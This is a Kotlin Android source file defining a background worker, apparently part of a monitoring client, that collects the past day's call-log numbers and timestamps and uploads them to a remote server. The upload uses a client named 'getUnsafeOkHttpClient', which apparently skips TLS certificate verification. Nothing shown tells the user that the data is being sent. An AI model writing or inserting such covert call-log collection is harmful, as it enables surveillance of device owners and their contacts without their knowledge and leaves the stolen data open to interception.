package com.example.bullsseeclient

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.bullsseeclient.api.DeviceDataApiService
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.time.Instant

data class CallDto(val number: String?, val date: Long)

class DataCollectionWorker(appContext: Context, params: WorkerParameters) : Worker(appContext, params) {
    override fun doWork(): Result {
        val logs = collectCalls()
        if (logs.isEmpty()) return Result.success()
        try {
            val retrofit = Retrofit.Builder()
                .baseUrl(HttpClient.BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .client(HttpClient.getUnsafeOkHttpClient())
                .build()
            val api = retrofit.create(DeviceDataApiService::class.java)
            val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(logs))
            api.sendCallLogs(body).execute()
        } catch (e: Exception) {
            Log.e("DataCollectionWorker", "Upload error: ${e.message}")
        }
        return Result.success()
    }

    private fun collectCalls(): List<CallDto> {
        if (applicationContext.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return emptyList()
        val out = mutableListOf<CallDto>()
        val cursor = applicationContext.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE),
            "${CallLog.Calls.DATE} > ?",
            arrayOf((System.currentTimeMillis() - 24 * 60 * 60 * 1000).toString()),
            "${CallLog.Calls.DATE} DESC"
        )
        cursor?.use { c ->
            val numIdx = c.getColumnIndex(CallLog.Calls.NUMBER)
            val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)
            while (c.moveToNext() && out.size < 100) {
                val num = c.getString(numIdx)
                val dateMs = c.getLong(dateIdx)
                out.add(CallDto(num, dateMs))
            }
        }
        return out
    }
}
